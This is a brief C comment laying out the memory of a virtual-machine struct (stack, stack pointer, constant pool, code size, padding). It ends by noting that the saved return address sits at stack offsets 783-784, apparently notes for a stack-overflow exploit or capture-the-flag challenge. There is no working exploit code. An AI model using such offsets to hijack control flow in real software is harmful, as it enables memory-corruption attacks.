// struct VM layout:
// - int stack[256]
// - int sp
// - int (padding)
// - const_t pool[128] * 4 ints per const_t:
//   - int location
//   - int type (0 for char*, 1 for int)
//   - char* (low)  Svalue or int Ivalue
//   - char* (high) Svalue or 0
// - int codeSize
// - int (padding)
// = 772 ints worth in the whole VM struct
// return address is at sp=783-784

